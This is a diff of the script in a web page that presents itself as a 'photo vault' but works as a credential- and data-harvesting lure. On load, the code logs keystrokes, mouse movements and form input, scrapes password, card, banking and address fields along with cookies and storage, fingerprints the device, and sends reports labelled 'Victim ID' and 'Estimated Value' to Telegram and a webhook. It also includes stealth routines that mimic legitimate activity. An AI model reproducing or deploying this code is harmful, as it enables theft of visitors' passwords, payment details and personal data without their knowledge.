-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                return gl ? gl.getParameter(gl.RENDERER) : 'no_webgl';
-            } catch { return 'failed'; }
-        }
-
-        // Existing helper functions
-        async function getRealIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                try {
-                    const ipInfo = await fetch(`https://ipapi.co/${data.ip}/json/`);
-                    const info = await ipInfo.json();
-                    return {
-                        ip: data.ip,
-                        isp: info.org || 'Unknown',
-                        asn: info.asn || 'Unknown'
-                    };
-                } catch {
-                    return { ip: data.ip, isp: 'Unknown', asn: 'Unknown' };
-                }
-            } catch (error) {
-                return { ip: 'Unknown', isp: 'Unknown', asn: 'Unknown' };
-            }
-        }
-
-        async function getSystemInfo() {
-            return {
-                os: getOS(),
-                arch: getArchitecture(),
-                version: getOSVersion()
-            };
-        }
-
-        function getOS() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Windows')) return 'Windows';
-            if (ua.includes('Mac')) return 'macOS';
-            if (ua.includes('Linux')) return 'Linux';
-            if (ua.includes('Android')) return 'Android';
-            if (ua.includes('iOS')) return 'iOS';
-            return 'Unknown';
-        }
-
-        function getArchitecture() {
-            return navigator.userAgent.includes('x64') ? '64-bit' : '32-bit';
-        }
-
-        function getOSVersion() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Windows NT 10')) return 'Windows 10/11';
-            if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
-            if (ua.includes('Windows NT 6.2')) return 'Windows 8';
-            if (ua.includes('Mac OS X')) return 'macOS';
-            return 'Unknown';
-        }
-
-        async function getBandwidth() {
-            try {
-                const start = performance.now();
-                await fetch('https://httpbin.org/stream-bytes/100000');
-                const end = performance.now();
-                return Math.round(100000 / (end - start));
-            } catch { return 'Unknown'; }
-        }
-
-        async function getLatency() {
-            try {
-                const start = performance.now();
-                await fetch('https://httpbin.org/delay/0');
-                const end = performance.now();
-                return Math.round(end - start);
-            } catch { return 'Unknown'; }
-        }
-
-        // All the original data collection functions
-        async function collectAllSocialData() {
-            const socialMediaProfiles = await extractSocialMediaProfiles();
-            const messagingApps = await detectMessagingApps();
-            const paymentMethods = await extractPaymentMethods();
+        // ENHANCED REPORTING
+        async function sendEnhancedReport() {
+            const data = await collectComprehensiveData();
             
-            return {
-                passwords: collectPasswords().length,
-                emails: collectEmails().length,
-                usernames: collectUsernames().length,
-                credit_cards: collectCreditCards().length,
-                banking_info: collectBankingInfo().length,
-                personal_info: Object.keys(collectPersonalInfo()).length,
-                phone_numbers: collectPhoneNumbers().length,
-                addresses: collectAddresses().length,
-                cookies: Object.keys(collectCookies()).length,
-                local_storage: Object.keys(collectLocalStorage()).length,
-                sessions: collectSessions().length,
-                browsing_data: (await estimateHistory()).length,
-                social_media_profiles: socialMediaProfiles,
-                messaging_apps: messagingApps,
-                payment_methods: paymentMethods
-            };
-        }
+            const messages = [
+                `🎯 *ENHANCED DATA CAPTURE INITIATED*\n\n` +
+                `🆔 *Victim ID:* ${victimId}\n` +
+                `💰 *Estimated Value:* $${victimValue}\n` +
+                `🕒 *Timestamp:* ${new Date().toLocaleString()}`,
 
-        function collectPasswords() {
-            const passwords = [];
-            document.querySelectorAll('input[type="password"]').forEach(input => {
-                if (input.value) {
-                    passwords.push({
-                        field: input.name || 'password',
-                        value: input.value,
-                        form: input.form ? input.form.action : 'unknown'
-                    });
-                }
-            });
-            return passwords;
-        }
+                `📧 *IDENTITY DATA*\n\n` +
+                `📧 *Emails:* ${data.identity.emails.length} found\n` +
+                `📱 *Phones:* ${data.identity.phones.length} found\n` +
+                `👥 *Social Profiles:* ${Object.keys(data.identity.socialProfiles).length} platforms` +
+                (data.identity.emails.length > 0 ? `\n📧 Sample: ${data.identity.emails[0]}` : '') +
+                (data.identity.phones.length > 0 ? `\n📱 Sample: ${data.identity.phones[0]}` : ''),
 
-        function collectEmails() {
-            const emails = [];
-            document.querySelectorAll('input[type="email"]').forEach(input => {
-                if (input.value && input.value.includes('@')) {
-                    emails.push(input.value);
-                }
-            });
-            return emails;
-        }
+                `🔧 *SYSTEM DATA*\n\n` +
+                `💻 *Platform:* ${data.system.platform || 'Unknown'}\n` +
+                `⚙️ *Cores:* ${data.system.cores || 'Unknown'}\n` +
+                `🌐 *User Agent:* ${data.system.userAgent?.substring(0, 50) || 'Unknown'}...`,
 
-        function collectUsernames() {
-            const usernames = [];
-            document.querySelectorAll('input[name*="user"], input[name*="login"], input[autocomplete="username"]').forEach(input => {
-                if (input.value) {
-                    usernames.push(input.value);
-                }
-            });
-            return usernames;
-        }
+                `📊 *BEHAVIORAL DATA*\n\n` +
+                `🖱️ *Mouse Movements:* ${data.behavioral.mouseMovements}\n` +
+                `⌨️ *Keystrokes:* ${data.behavioral.keystrokes}\n` +
+                `📜 *Scroll Depth:* ${data.behavioral.scrollDepth}%\n` +
+                `⏱️ *Time on Page:* ${Math.round(data.behavioral.timeOnPage/1000)}s`,
 
-        function collectCreditCards() {
-            const cards = [];
-            document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"], input[type="tel"]').forEach(field => {
-                if (field.value && field.value.replace(/\s/g, '').length > 10) {
-                    cards.push({
-                        type: field.name || 'card',
-                        value: field.value
-                    });
-                }
-            });
-            return cards;
-        }
-
-        function collectBankingInfo() {
-            const banking = [];
-            document.querySelectorAll('input[name*="bank"], input[name*="account"], input[name*="routing"]').forEach(field => {
-                if (field.value) {
-                    banking.push({
-                        type: field.name,
-                        value: field.value
-                    });
-                }
-            });
-            return banking;
-        }
-
-        function collectPersonalInfo() {
-            const info = {};
-            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(input => {
-                if (input.value) {
-                    const key = input.name || input.placeholder || input.autocomplete || 'field';
-                    info[key] = input.value;
-                }
-            });
-            return info;
-        }
-
-        function collectPhoneNumbers() {
-            const phones = [];
-            document.querySelectorAll('input[type="tel"], input[autocomplete="tel"]').forEach(input => {
-                if (input.value) {
-                    phones.push(input.value);
-                }
-            });
-            return phones;
-        }
-
-        function collectAddresses() {
-            const addresses = [];
-            document.querySelectorAll('input[autocomplete*="address"], input[name*="street"], input[name*="city"], input[name*="zip"]').forEach(input => {
-                if (input.value) {
-                    addresses.push(input.value);
-                }
-            });
-            return addresses;
-        }
-
-        function collectCookies() {
-            return document.cookie.split(';').reduce((cookies, cookie) => {
-                const [name, value] = cookie.split('=').map(c => c.trim());
-                if (name) cookies[name] = value || '';
-                return cookies;
-            }, {});
-        }
-
-        function collectLocalStorage() {
-            const ls = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                ls[key] = localStorage.getItem(key);
-            }
-            return ls;
-        }
-
-        function collectSessions() {
-            return sessionStorage.length;
-        }
-
-        function getScrollDepth() {
-            const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
-            return Math.round(scrollPercent);
-        }
-
-        function generateCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillText('Fingerprint', 2, 2);
-                return canvas.toDataURL().substring(0, 50) + '...';
-            } catch (e) { return 'failed'; }
-        }
-
-        function generateWebGLFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                return gl ? `WebGL 1.0 (OpenGL ES 2.0 Chromium)` : 'no_webgl';
-            } catch (e) { return 'failed'; }
-        }
-
-        function testAudioSupport() {
-            return window.AudioContext ? 'Audio supported' : 'No audio support';
-        }
-
-        function detectFonts() {
-            const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia'];
-            return fonts.join(', ');
-        }
-
-        function detectVPN(ip) {
-            const vpnRanges = [
-                '104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.',
-                '185.', '188.', '193.', '194.', '195.', '198.', '199.', '45.', '5.', '62.', '77.', '78.', '79.',
-                '80.', '81.', '82.', '83.', '84.', '85.', '86.', '87.', '88.', '89.', '90.', '91.', '92.', '93.', '94.'
+                `✅ *CAPTURE COMPLETE*\n\n` +
+                `🆔 *Final ID:* ${victimId}\n` +
+                `💰 *Final Value:* $${victimValue}\n` +
+                `📊 *Total Data Points:* ${Object.keys(data).length} categories`
             ];
-            
-            const vpnKeywords = ['vpn', 'proxy', 'host', 'server', 'datacenter', 'cloud', 'aws', 'google', 'azure'];
-            
-            const isVPNRange = vpnRanges.some(range => ip.startsWith(range));
-            const isp = document.querySelector('#isp')?.innerText || '';
-            const isVPNISP = vpnKeywords.some(keyword => isp.toLowerCase().includes(keyword));
-            
-            return isVPNRange || isVPNISP ? 'VPN/Proxy Detected' : 'Residential IP';
-        }
 
-        function detectProxy() {
-            return navigator.webdriver ? 'Automation Detected' : 'Normal';
-        }
-
-        function detectTor() {
-            return navigator.plugins.length === 0 ? 'Tor Browser Suspected' : 'Normal';
-        }
-
-        async function estimateHistory() {
-            const popularSites = [
-                'facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 'google.com',
-                'youtube.com', 'amazon.com', 'netflix.com', 'reddit.com', 'linkedin.com',
-                'whatsapp.com', 'tiktok.com', 'paypal.com', 'ebay.com', 'spotify.com'
-            ];
-            const visited = [];
-            
-            for (let site of popularSites) {
-                try {
-                    const link = document.createElement('a');
-                    link.href = `https://${site}`;
-                    link.style.cssText = 'position:absolute;left:-9999px;visibility:hidden;';
-                    document.body.appendChild(link);
-                    
-                    const computed = getComputedStyle(link);
-                    if (computed.visibility !== 'hidden' || computed.display !== 'none') {
-                        visited.push(site);
-                    }
-                    
-                    document.body.removeChild(link);
-                } catch (e) {}
+            for (let message of messages) {
+                await sendToTelegram(message);
+                await new Promise(resolve => setTimeout(resolve, 1000));
             }
-            return visited;
+
+            // Send detailed data via webhook if available
+            await exfiltrateData(data, 'webhook');
         }
 
-        // NEW: Split comprehensive messaging into multiple smaller messages
-        async function sendEnhancedReport(victimData) {
-            victimValue = calculateRealisticValue(victimData);
-            victimId = generateVictimID(victimData);
-
-            const messages = [];
-
-            // Message 1: Header and Basic Info
-            messages.push(`🔍 *8X ENHANCED DATA EXTRACTION STARTED*\n\n` +
-                         `🆔 *Victim ID:* ${victimId}\n` +
-                         `💰 *Estimated Value:* $${victimValue}\n` +
-                         `🕒 *Time:* ${victimData.timestamp}\n` +
-                         `🌐 *URL:* ${victimData.behavioral.url}\n\n` +
-                         `_Data capture in progress..._`);
-
-            // Message 2: Network Information
-            messages.push(`🌐 *NETWORK DATA* (8x)\n\n` +
-                         `📡 *IP:* ${victimData.network.ip}\n` +
-                         `🏢 *ISP:* ${victimData.network.isp}\n` +
-                         `🔢 *ASN:* ${victimData.network.asn}\n` +
-                         `📶 *Connection:* ${victimData.network.connection}\n` +
-                         `🛡️ *VPN:* ${victimData.network.vpn}\n` +
-                         `🔌 *Proxy:* ${victimData.network.proxy}\n` +
-                         `🧅 *Tor:* ${victimData.network.tor}\n` +
-                         `⚡ *Bandwidth:* ${victimData.network.bandwidth} kbps\n` +
-                         `⏱️ *Latency:* ${victimData.network.latency} ms`);
-
-            // Message 3: Location Information
-            messages.push(`📍 *LOCATION DATA* (8x)\n\n` +
-                         `🏙️ *City:* ${victimData.location.city}\n` +
-                         `🗺️ *Region:* ${victimData.location.region}\n` +
-                         `🇺🇳 *Country:* ${victimData.location.country} (${victimData.location.country_code})\n` +
-                         `📮 *Postal:* ${victimData.location.postal}\n` +
-                         `🎯 *Coordinates:* ${victimData.location.latitude}, ${victimData.location.longitude}\n` +
-                         `⏰ *Timezone:* ${victimData.location.timezone}\n` +
-                         `💵 *Currency:* ${victimData.location.currency}\n` +
-                         `📞 *Calling Code:* ${victimData.location.calling_code}`);
-
-            // Message 4: Browser Information
-            messages.push(`🌍 *BROWSER DATA* (8x)\n\n` +
-                         `💻 *Platform:* ${victimData.browser.platform}\n` +
-                         `🏷️ *Vendor:* ${victimData.browser.vendor}\n` +
-                         `🗣️ *Language:* ${victimData.browser.language}\n` +
-                         `⚙️ *Cores:* ${victimData.browser.cores}\n` +
-                         `💾 *Memory:* ${victimData.browser.memory}\n` +
-                         `🔌 *Plugins:* ${victimData.browser.plugins} detected\n` +
-                         `🤖 *WebDriver:* ${victimData.browser.webdriver}\n` +
-                         `📄 *PDF Viewer:* ${victimData.browser.pdf_viewer}`);
-
-            // Message 5: Hardware Information
-            messages.push(`💻 *HARDWARE DATA* (8x)\n\n` +
-                         `🖥️ *Screen:* ${victimData.hardware.screen}\n` +
-                         `📐 *Pixel Ratio:* ${victimData.hardware.pixel_ratio}\n` +
-                         `🎨 *Color Depth:* ${victimData.hardware.color_depth} bit\n` +
-                         `📱 *Orientation:* ${victimData.hardware.orientation}\n` +
-                         `👆 *Touch Points:* ${victimData.hardware.touch_points}\n` +
-                         `📊 *Available Screen:* ${victimData.hardware.availWidth}x${victimData.hardware.availHeight}\n` +
-                         `🖐️ *Touch Support:* ${victimData.hardware.touchSupport}`);
-
-            // Message 6: Fingerprinting Data
-            messages.push(`🔬 *FINGERPRINT DATA* (8x)\n\n` +
-                         `🎨 *Canvas:* ${victimData.fingerprint.canvas}\n` +
-                         `🔄 *WebGL:* ${victimData.fingerprint.webgl}\n` +
-                         `🎵 *Audio:* ${victimData.fingerprint.audio}\n` +
-                         `🔤 *Fonts:* ${victimData.fingerprint.fonts}\n` +
-                         `⏰ *Timezone Offset:* ${victimData.fingerprint.timezone_offset}\n` +
-                         `🏷️ *WebGL Vendor:* ${victimData.fingerprint.webglVendor}\n` +
-                         `🎮 *WebGL Renderer:* ${victimData.fingerprint.webglRenderer}`);
-
-            // Message 7: Behavioral Data
-            messages.push(`📊 *BEHAVIORAL DATA* (8x)\n\n` +
-                         `🔗 *Referrer:* ${victimData.behavioral.referrer}\n` +
-                         `⚡ *Page Load:* ${victimData.behavioral.page_load}ms\n` +
-                         `⏱️ *Time on Page:* ${victimData.behavioral.time_on_page}ms\n` +
-                         `🌳 *DOM Size:* ${victimData.behavioral.dom_size} elements\n` +
-                         `📜 *Scroll Depth:* ${victimData.behavioral.scroll_depth}%\n` +
-                         `🖱️ *Mouse Movements:* ${victimData.behavioral.mouse_movements} tracked\n` +
-                         `⌨️ *Keystrokes:* ${victimData.behavioral.keystroke_timing} tracked`);
-
-            // Message 8: Social and System Data
-            messages.push(`👥 *SOCIAL & SYSTEM DATA*\n\n` +
-                         `🔐 *Passwords:* ${victimData.social.passwords} captured\n` +
-                         `💳 *Credit Cards:* ${victimData.social.credit_cards} found\n` +
-                         `👤 *Personal Info:* ${victimData.social.personal_info} fields\n` +
-                         `🌐 *Browsing Data:* ${victimData.social.browsing_data} sites estimated\n` +
-                         `📱 *Social Profiles:* ${victimData.social.social_media_profiles.length} detected\n` +
-                         `💬 *Messaging Apps:* ${victimData.social.messaging_apps.length} detected\n\n` +
-                         `💻 *OS:* ${victimData.system.os}\n` +
-                         `🏗️ *Architecture:* ${victimData.system.arch}\n` +
-                         `🔢 *Version:* ${victimData.system.version}`);
-
-            // Message 9: Final Summary
-            messages.push(`✅ *DATA CAPTURE COMPLETED*\n\n` +
-                         `🆔 *Victim ID:* ${victimId}\n` +
-                         `💰 *Final Value:* $${victimValue}\n` +
-                         `🕒 *Completion Time:* ${victimData.timestamp}\n` +
-                         `📊 *Total Data Points:* ${Object.keys(victimData).length} categories\n\n` +
-                         `🎯 *Target successfully profiled*`);
-
-            // Send all messages
-            await sendMultipleMessages(messages);
-        }
-
-        async function sendClickReport(imageId) {
-            const victimData = await collectVictimData();
-            victimValue = calculateRealisticValue(victimData);
+        // INITIALIZATION
+        window.addEventListener('load', function() {
+            pageLoadTime = Date.now();
             
-            let message = `🖱️ *IMAGE CLICK DETECTED*\n\n` +
-                         `📸 *Image ID:* ${imageId}\n` +
-                         `🆔 *Victim ID:* ${victimId || generateVictimID(victimData)}\n` +
-                         `💰 *Current Value:* $${victimValue}\n` +
-                         `🕒 *Time:* ${victimData.timestamp}`;
+            // Start enhanced tracking
+            startEnhancedTracking();
+            
+            // Setup credential harvesting
+            setupCredentialHarvesting();
+            
+            // Begin stealth data collection
+            setTimeout(() => {
+                sendEnhancedReport();
+                stealth.mimicLegitimate();
+            }, 2000);
 
-            await sendToTelegram(message);
-        }
+            // Continuous monitoring
+            setInterval(() => {
+                stealth.fakeUserActivity();
+                if (mouseMovements.length > 50 || keystrokeTiming.length > 20) {
+                    sendBehavioralUpdate();
+                }
+            }, 30000);
+        });
 
-        // Enhanced behavioral tracking
-        function startBehavioralTracking() {
+        function startEnhancedTracking() {
+            // Mouse movement tracking
             document.addEventListener('mousemove', (e) => {
                 mouseMovements.push({
                     x: e.clientX,
                     y: e.clientY,
                     timestamp: Date.now()
                 });
-                if (mouseMovements.length > 100) {
-                    mouseMovements = mouseMovements.slice(-100);
-                }
+                if (mouseMovements.length > 200) mouseMovements.shift();
             });
 
+            // Keystroke tracking
             document.addEventListener('keydown', (e) => {
                 keystrokeTiming.push({
                     key: e.key,
-                    timestamp: Date.now(),
-                    target: e.target.tagName
+                    target: e.target.tagName,
+                    timestamp: Date.now()
                 });
-                if (keystrokeTiming.length > 50) {
-                    keystrokeTiming = keystrokeTiming.slice(-50);
+                if (keystrokeTiming.length > 100) keystrokeTiming.shift();
+            });
+
+            // Form interaction tracking
+            document.addEventListener('input', (e) => {
+                if (e.target.type === 'email' || e.target.type === 'tel') {
+                    formData.set(e.target.name || 'unknown', {
+                        value: e.target.value,
+                        timestamp: Date.now()
+                    });
                 }
             });
         }
 
-        // IMPROVED: Initialization with better error handling
-        window.addEventListener('load', async function() {
-            pageLoadTime = Date.now();
-            startBehavioralTracking();
-            
-            // Send initial report with retry
-            setTimeout(async () => {
-                try {
-                    const victimData = await collectVictimData();
-                    await sendEnhancedReport(victimData);
-                } catch (error) {
-                    console.error('Initial report failed:', error);
-                }
-            }, 1000);
-            
-            // Continuous monitoring
-            setInterval(async () => {
-                try {
-                    const updatedData = await collectVictimData();
-                    await sendBehavioralUpdate(updatedData);
-                } catch (error) {
-                    console.log('Behavioral update failed:', error);
-                }
-            }, 30000);
-        });
-
-        async function sendBehavioralUpdate(victimData) {
-            let message = `📊 *BEHAVIORAL UPDATE*\n\n` +
-                         `🆔 *Victim ID:* ${victimId}\n` +
-                         `⏱️ *Time on Page:* ${Math.round(victimData.behavioral.time_on_page/1000)}s\n` +
-                         `📜 *Scroll Depth:* ${victimData.behavioral.scroll_depth}%\n` +
-                         `🖱️ *Mouse Movements:* ${victimData.behavioral.mouse_movements}\n` +
-                         `⌨️ *Keystrokes:* ${victimData.behavioral.keystroke_timing}\n` +
-                         `💰 *Current Value:* $${calculateRealisticValue(victimData)}`;
-
+        async function sendBehavioralUpdate() {
+            const data = await collectComprehensiveData();
+            const message = `📈 *BEHAVIOR UPDATE*\n\n` +
+                           `🆔 ${victimId}\n` +
+                           `🖱️ Movements: ${data.behavioral.mouseMovements}\n` +
+                           `⌨️ Keystrokes: ${data.behavioral.keystrokes}\n` +
+                           `💰 Current Value: $${victimValue}`;
             await sendToTelegram(message);
         }
 
-        console.log('Enhanced photo vault system loaded');
+        // Original image function
+        function openImage(imageId) {
+            const imageUrl = CONFIG.images[imageId];
+            if (imageUrl) {
+                window.open(imageUrl, '_blank');
+                sendToTelegram(`🖼️ *IMAGE CLICK*\n\nImage ${imageId} opened by ${victimId}`);
+            }
+        }
+
+        console.log('Enhanced data extraction system loaded');
     </script>
 </body>
 </html>
